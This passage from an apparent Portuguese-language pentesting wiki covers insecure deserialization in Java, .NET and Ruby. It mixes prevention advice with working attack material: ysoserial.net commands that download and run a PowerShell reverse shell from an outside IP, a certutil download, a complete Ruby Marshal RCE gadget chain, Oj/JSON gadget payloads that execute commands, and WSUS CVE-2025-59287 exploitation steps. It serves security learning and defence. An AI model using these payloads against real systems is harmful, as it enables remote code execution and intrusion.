- **Protocolos personalizados**: Em Java, a prática padrão envolve a transmissão de objetos Java brutos, o que será demonstrado em exemplos de exploit a seguir.

### Prevenção

#### Objetos transient

Uma classe que implementa `Serializable` pode declarar como `transient` qualquer objeto dentro da classe que não deveria ser serializável. Por exemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evitar a serialização de uma classe que precisa implementar Serializable

Em cenários onde certos **objetos devem implementar a `Serializable`** devido à hierarquia de classes, existe o risco de desserialização não intencional. Para prevenir isso, assegure que esses objetos sejam não-desserializáveis definindo um método `final` `readObject()` que consistentemente lança uma exceção, como mostrado abaixo:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Aprimorando a Segurança da Desserialização em Java**

**Personalizar `java.io.ObjectInputStream`** é uma abordagem prática para proteger processos de desserialização. Este método é adequado quando:

- O código de desserialização está sob seu controle.
- As classes esperadas para desserialização são conhecidas.

Sobrescreva o método **`resolveClass()`** para limitar a desserialização apenas às classes permitidas. Isso evita a desserialização de qualquer classe, exceto as explicitamente autorizadas, como no exemplo a seguir que restringe a desserialização apenas à classe `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** oferece uma solução alternativa quando não é possível modificar o código. Este método aplica-se principalmente para **blacklisting harmful classes**, usando um parâmetro da JVM:
```
-javaagent:name-of-agent.jar
```
Fornece uma forma de proteger a desserialização dinamicamente, ideal para ambientes onde mudanças imediatas no código são impraticáveis.

Confira um exemplo em [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementando Filtros de Serialização**: O Java 9 introduziu filtros de serialização através da interface **`ObjectInputFilter`**, fornecendo um mecanismo poderoso para especificar critérios que objetos serializados devem atender antes de serem desserializados. Esses filtros podem ser aplicados globalmente ou por stream, oferecendo controle granular sobre o processo de desserialização.

Para utilizar filtros de serialização, você pode definir um filtro global que se aplica a todas as operações de desserialização ou configurá-lo dinamicamente para streams específicos. Por exemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Aproveitando Bibliotecas Externas para Maior Segurança**: Bibliotecas como **NotSoSerial**, **jdeserialize** e **Kryo** oferecem funcionalidades avançadas para controlar e monitorar Java deserialization. Essas bibliotecas podem fornecer camadas adicionais de segurança, como whitelisting ou blacklisting de classes, análise de objetos serializados antes da deserialization e implementação de estratégias de serialização customizadas.

- **NotSoSerial** intercepta processos de deserialization para evitar a execução de código não confiável.
- **jdeserialize** permite a análise de objetos Java serializados sem deserializá-los, ajudando a identificar conteúdo potencialmente malicioso.
- **Kryo** é um framework alternativo de serialization que enfatiza velocidade e eficiência, oferecendo estratégias de serialização configuráveis que podem aumentar a segurança.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Encontre o que é **JNDI Injection, como abusar disso via RMI, CORBA & LDAP e como explorar log4shell** (e um exemplo dessa vuln) na página seguinte:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

There are several products using this middleware to send messages:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

Então, basicamente existem **vários serviços que usam JMS de maneira perigosa**. Portanto, se você tem **privilégios suficientes** para enviar mensagens para esses serviços (normalmente será preciso credenciais válidas) você pode ser capaz de enviar **objetos maliciosos serializados que serão deserializados pelo consumer/subscriber**.\
Isso significa que, nessa exploração, **todos os clientes que forem usar essa mensagem acabarão infectados**.

Deve-se lembrar que mesmo que um serviço seja vulnerável (porque está deserializando input de usuário de forma insegura) você ainda precisa encontrar gadgets válidos para explorar a vulnerabilidade.

A ferramenta [JMET](https://github.com/matthiaskaiser/jmet) foi criada para **conectar-se e atacar esses serviços enviando vários objetos maliciosos serializados usando gadgets conhecidos**. Esses exploits irão funcionar se o serviço ainda for vulnerável e se qualquer um dos gadgets usados estiver presente na aplicação vulnerável.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

No contexto de .Net, explorações de deserialization operam de forma semelhante às encontradas em Java, onde gadgets são explorados para executar código específico durante a deserialization de um objeto.

### Fingerprint

#### WhiteBox

O código-fonte deve ser inspecionado em busca de ocorrências de:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

O foco deve ser em serializers que permitem que o tipo seja determinado por uma variável sob controle do usuário.

#### BlackBox

A busca deve mirar na string Base64 codificada **AAEAAAD/////** ou qualquer padrão similar que possa ser deserializado no lado do servidor, concedendo controle sobre o tipo a ser deserializado. Isso pode incluir, mas não se limita a, estruturas **JSON** ou **XML** contendo `TypeObject` ou `$type`.

### ysoserial.net

Nesse caso você pode usar a ferramenta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **criar os exploits de deserialization**. Uma vez baixado o repositório git você deve **compilar a ferramenta** usando Visual Studio, por exemplo.

Se você quer aprender **como o ysoserial.net cria seu exploit** você pode [**check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

As principais opções do **ysoserial.net** são: **`--gadget`**, **`--formatter`**, **`--output`** e **`--plugin`.**

- **`--gadget`** usado para indicar o gadget a ser abusado (indicar a classe/função que será abusada durante a deserialization para executar comandos).
- **`--formatter`**, usado para indicar o método para serializar o exploit (você precisa saber qual biblioteca o back-end está usando para deserializar o payload e usar a mesma para serializá-lo)
- **`--output`** usado para indicar se você quer o exploit em **raw** ou **base64** codificado. _Note que **ysoserial.net** irá **codificar** o payload usando **UTF-16LE** (codificação usada por padrão no Windows) então se você pegar o raw e apenas codificá-lo de um console linux você pode ter problemas de **compatibilidade de encoding** que impedirão o exploit de funcionar corretamente (na caixa JSON do HTB o payload funcionou tanto em UTF-16LE quanto em ASCII, mas isso não significa que sempre funcionará)._
- **`--plugin`** ysoserial.net suporta plugins para criar **exploits para frameworks específicos** como ViewState

#### More ysoserial.net parameters

- `--minify` will provide a **smaller payload** (if possible)
- `--raf -f Json.Net -c "anything"` This will indicate all the gadgets that can be used with a provided formatter (`Json.Net` in this case)
- `--sf xml` you can **indicate a gadget** (`-g`)and ysoserial.net will search for formatters containing "xml" (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** também tem um **parâmetro muito interessante** que ajuda a entender melhor como cada exploit funciona: `--test`\
Se você indicar esse parâmetro **ysoserial.net** irá **tentar** o **exploit localmente,** assim você pode testar se seu payload funcionará corretamente.\
Esse parâmetro é útil porque, se você revisar o código, encontrará trechos de código como o seguinte (do [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Isso significa que, para testar o exploit, o código chamará [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
No **código anterior está vulnerável ao exploit criado**. Portanto, se você encontrar algo similar em uma aplicação .Net, isso significa que provavelmente essa aplicação também é vulnerável.\
Portanto o parâmetro **`--test`** nos permite entender **quais trechos de código são vulneráveis** ao exploit de deserialização que **ysoserial.net** pode criar.

### ViewState

Dê uma olhada em [this POST about **how to try to exploit the \_\_ViewState parameter of .Net** ](exploiting-__viewstate-parameter.md) para **executar código arbitrário.** Se você **já conhece os segredos** usados pela máquina vítima, [**read this post to know to execute code**](exploiting-__viewstate-knowing-the-secret.md).

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Endpoints afetados:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie descriptografado e então desserializado com BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch e operações SOAP relacionadas que atingem sinks do SoapFormatter; gadget em base64 é processado quando o console WSUS consome o evento.
- Causa raiz: bytes controlados pelo atacante alcançam formatadores .NET legados (BinaryFormatter/SoapFormatter) sem allow‑lists/binders estritos, fazendo com que cadeias de gadgets executem como a conta de serviço do WSUS (frequentemente SYSTEM).

Exploração mínima (caminho Reporting):
1) Gere um gadget .NET com ysoserial.net (BinaryFormatter ou SoapFormatter) e gere saída em base64, por exemplo:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Criar um SOAP para `ReportEventBatch` incorporando o gadget em base64 e enviá-lo via POST para `/ReportingWebService.asmx`.
3) Quando um administrador abrir o console do WSUS, o evento é desserializado e o gadget é executado (RCE como SYSTEM).

AuthorizationCookie / GetCookie()
- Um AuthorizationCookie forjado pode ser aceito, decriptado e passado para um BinaryFormatter sink, permitindo pre‑auth RCE se acessível.

Parâmetros do PoC público (tecxx/CVE-2025-59287-WSUS):
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
Veja [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Prevenção

Para mitigar os riscos associados à desserialização em .Net:

- **Evite permitir que fluxos de dados definam seus tipos de objeto.** Utilize `DataContractSerializer` ou `XmlSerializer` quando possível.
- **Para `JSON.Net`, defina `TypeNameHandling` como `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Evite usar `JavaScriptSerializer` com um `JavaScriptTypeResolver`.**
- **Limite os tipos que podem ser desserializados**, compreendendo os riscos inerentes a tipos .Net, como `System.IO.FileInfo`, que podem modificar propriedades de arquivos do servidor, potencialmente levando a ataques de negação de serviço.
- **Tenha cuidado com tipos que possuem propriedades arriscadas**, como `System.ComponentModel.DataAnnotations.ValidationException` com sua propriedade `Value`, que pode ser explorada.
- **Controle com segurança a instanciação de tipos** para impedir que atacantes influenciem o processo de desserialização, tornando mesmo `DataContractSerializer` ou `XmlSerializer` vulneráveis.
- **Implemente controles de lista branca** usando um `SerializationBinder` customizado para `BinaryFormatter` e `JSON.Net`.
- **Mantenha-se informado sobre gadgets de desserialização inseguros** conhecidos no .Net e garanta que desserializadores não instanciem tais tipos.
- **Isole código potencialmente arriscado** do código com acesso à internet para evitar expor gadgets conhecidos, como `System.Windows.Data.ObjectDataProvider` em aplicações WPF, a fontes de dados não confiáveis.

### **Referências**

- Artigo sobre desserialização JSON em Java e .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf), palestra: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) e slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

No Ruby, a serialização é realizada por dois métodos da biblioteca **marshal**. O primeiro método, conhecido como **dump**, é usado para transformar um objeto em um fluxo de bytes. Esse processo é chamado de serialização. Por outro lado, o segundo método, **load**, é empregado para reverter um fluxo de bytes de volta a um objeto, processo conhecido como desserialização.

Para proteger objetos serializados, **Ruby emprega HMAC (Hash-Based Message Authentication Code)**, garantindo a integridade e autenticidade dos dados. A chave utilizada para esse propósito é armazenada em um dos seguintes locais:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (mais info em** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Other RCE chain to exploit Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Método .send() do Ruby

Como explicado em [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), se uma entrada de usuário não sanitizada atingir o método `.send()` de um objeto ruby, esse método permite **invocar qualquer outro método** do objeto com quaisquer parâmetros.

Por exemplo, chamar eval e então código ruby como segundo parâmetro permitirá executar código arbitrário:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Além disso, se apenas um parâmetro de **`.send()`** for controlado por um atacante, como mencionado no writeup anterior, é possível chamar qualquer método do objeto que **não necessite de argumentos** ou cujos argumentos tenham **valores padrão**.\
Para isso, é possível enumerar todos os métodos do objeto para **encontrar alguns métodos interessantes que satisfaçam esses requisitos**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Veja como pode ser possível [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

Ao enviar no corpo alguns valores não hasháveis, como um array, eles serão adicionados em uma nova chave chamada `_json`. No entanto, é possível que um atacante também defina no corpo um valor chamado `_json` com os valores arbitrários que desejar. Então, se o backend, por exemplo, verifica a veracidade de um parâmetro mas depois também usa o parâmetro `_json` para executar alguma ação, um bypass de autorização pode ser realizado.

Consulte mais informações na [Ruby _json pollution page](ruby-_json-pollution.md).

### Outras bibliotecas

Esta técnica foi retirada[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

There are other Ruby libraries that can be used to serialize objects and therefore that could be abused to gain RCE during an insecure deserialization. The following table shows some of these libraries and the method they called of the loaded library whenever it's unserialized (function to abuse to get RCE basically):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Biblioteca</strong></td><td><strong>Dados de entrada</strong></td><td><strong>Método acionador dentro da classe</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Exemplo básico:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
No caso de tentar abusar do Oj, foi possível encontrar uma gadget class que, dentro de sua função `hash`, chamaria `to_s`, que chamaria spec, que chamaria fetch_path, que podia ser feito para buscar uma URL aleatória, fornecendo um ótimo detector desse tipo de unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Além disso, foi constatado que, com a técnica anterior, um diretório também é criado no sistema, o que é um requisito para abusar de outro gadget e transformá-lo em um RCE completo com algo como:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Cache do Bootstrap

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identificar a Vulnerabilidade e o Ambiente

A funcionalidade de upload de arquivos da aplicação Rails permite que um atacante escreva arquivos arbitrariamente. Embora a aplicação rode com restrições (apenas certos diretórios como tmp são graváveis devido ao non-root user do Docker), isso ainda permite escrita no diretório de cache do Bootsnap (tipicamente under tmp/cache/bootsnap).

- Entender o Mecanismo de Cache do Bootsnap

Bootsnap speeds up Rails boot times by caching compiled Ruby code, YAML, and JSON files. Ele armazena arquivos de cache que incluem um cache key header (com campos like Ruby version, file size, mtime, compile options, etc.) seguido pelo código compilado. Esse header é usado para validar o cache durante o startup da aplicação.

- Coletar Metadados do Arquivo

O atacante primeiro seleciona um arquivo alvo que provavelmente é carregado durante o startup do Rails (por exemplo, set.rb from Ruby’s standard library). Executando código Ruby dentro do container, ele extrai metadados críticos (such as RUBY_VERSION, RUBY_REVISION, size, mtime, and compile_option). Esses dados são essenciais para craftar uma cache key válida.

- Calcular o Caminho do Arquivo de Cache

Ao replicar o mecanismo de hash FNV-1a 64-bit do Bootsnap, determina-se o caminho correto do arquivo de cache. Esse passo garante que o arquivo de cache malicioso seja colocado exatamente onde o Bootsnap espera (e.g., under tmp/cache/bootsnap/compile-cache-iseq/).

- Criar o Arquivo de Cache Malicioso

O atacante prepara um payload que:

- Executa comandos arbitrários (for example, running id to show process info).
- Remove o cache malicioso após a execução para prevenir exploração recursiva.
- Carrega o arquivo original (e.g., set.rb) para evitar que a aplicação quebre.

Esse payload é compilado em código Ruby binário e concatenado com um cache key header cuidadosamente construído (using the previously gathered metadata and the correct version number for Bootsnap).

- Sobrescrever e Acionar a Execução

Usando a arbitrary file write vulnerability, o atacante escreve o arquivo de cache criado no local calculado. Em seguida, ele aciona um server restart (by writing to tmp/restart.txt, which is monitored by Puma). Durante o restart, quando Rails requires o arquivo alvo, o arquivo de cache malicioso é carregado, resultando em remote code execution (RCE).



### Ruby Marshal exploitation in practice (updated)

Treat any path where untrusted bytes reach `Marshal.load`/`marshal_load` as an RCE sink. Marshal reconstrói grafos de objetos arbitrários e aciona library/gem callbacks durante a materialização.


- Caminho mínimo de código Rails vulnerável:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Classes de gadgets comuns vistas em cadeias reais: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Indicador típico de efeito colateral embutido em payloads (executado durante o unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Where it surfaces in real apps:
- Rails cache stores and session stores historicamente usando Marshal
- Backends de background jobs e object stores com persistência em arquivo
- Qualquer persistência customizada ou transporte de blobs binários de objetos

Industrialized gadget discovery:
- Grep por constructors, `hash`, `_load`, `init_with`, ou métodos com efeitos colaterais invocados durante o unmarshal
- Use CodeQL’s Ruby unsafe deserialization queries para traçar sources → sinks e surface gadgets
- Valide com PoCs multi-formato públicos (JSON/XML/YAML/Marshal)


## References

- Trail of Bits – Marshal madness: Uma breve história dos exploits de deserialização em Ruby: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
